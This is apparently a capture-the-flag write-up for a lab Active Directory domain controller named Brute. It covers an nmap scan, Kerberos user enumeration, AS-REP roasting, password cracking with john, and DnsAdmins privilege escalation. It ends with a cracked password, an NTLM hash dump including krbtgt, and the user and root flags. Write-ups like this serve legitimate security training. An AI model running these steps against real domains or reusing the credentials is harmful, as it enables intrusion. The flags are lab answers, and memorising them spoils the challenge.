# BRUTE / Active Directory

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/d021708423ec45ff9b88d667b17ca420.png)

## NMAP SCAN

```text
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-03-15 22:11:15Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRUTE
|   NetBIOS_Domain_Name: BRUTE
|   NetBIOS_Computer_Name: BRUTE-DC
|   DNS_Domain_Name: brute.csl
|   DNS_Computer_Name: Brute-DC.brute.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-15T22:12:15+00:00
|_ssl-date: 2021-03-15T22:12:23+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

ADD brute.csl to your hosts

## SMB ENUMERATION

* DEAD END

## LDAP ENUMERATION

* NOTHING INTERESTING

  ```text
  PORT    STATE SERVICE VERSION
  389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: brute.csl, Site: Default-First-Site-Name)
  | ldap-rootdse: 
  | LDAP Results
  |   <ROOT>
  |       domainFunctionality: 7
  |       forestFunctionality: 7
  |       domainControllerFunctionality: 7
  |       rootDomainNamingContext: DC=brute,DC=csl
  |       ldapServiceName: brute.csl:brute-dc$@BRUTE.CSL
  |       isGlobalCatalogReady: TRUE
  |       supportedSASLMechanisms: GSSAPI
  |       supportedSASLMechanisms: GSS-SPNEGO
  |       supportedSASLMechanisms: EXTERNAL
  |       supportedSASLMechanisms: DIGEST-MD5
  ------REDACTED---------------
  ```

## KERBEROS

### USER ENUMERATION

```text
kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain BRUTE -dc-ip brute.csl
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/ac4ca40e463c421aae2f7efdf0fddd98.png)

```text
GetNPUsers.py brute.csl/ -usersfile name.txt -format john -outputfile hash
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/4059f897a57f4d37bdae61f1d9c367d2.png)

```text
sudo john --wordlist=/opt/passwd/rockyou.txt hash
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/0b857cd1b42a4960bdf68bd5c87b75d7.png)

## GET SHELL

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/c7710267ed8942759e88bc3b4e0fe1ee.png)

### WINPEAS

* DNSADMIN GROUP

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/fd84e5e3d6194c8482155fd964f2e974.png)

## PRIVESC

* [https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges\#dnsadmins](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#dnsadmins)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/6812b05362194ad3bb8bbf1193143cdf.png)

## CREDS

```text
tess:Unique1
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e2068a39ee8150b697797d6c3e513df7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:dce76e96c26970aa2b5073fc7d1039c0:::
darleen:1103:aad3b435b51404eeaad3b435b51404ee:010cd964be3ff74c0b02ad6b8055a990:::
malcolm:1104:aad3b435b51404eeaad3b435b51404ee:d0997f56bbdfc941c5c03a19268e3a44:::
Patrick:1105:aad3b435b51404eeaad3b435b51404ee:aaf14517351412e9d5264e354515a155:::
Tess:1106:aad3b435b51404eeaad3b435b51404ee:f51333fc5222add92d7e311ec06bd2ef:::
BRUTE-DC$:1000:aad3b435b51404eeaad3b435b51404ee:84ea5cc74bb571005e2ddc5cd72ca734:::
```

## FLAGS

### USER

```text
fb23c6d8d663aa63870cfb5e535597a8
```

### ROOT

```text
393bca87e3cb9dc049f3e61483f83cc1
```

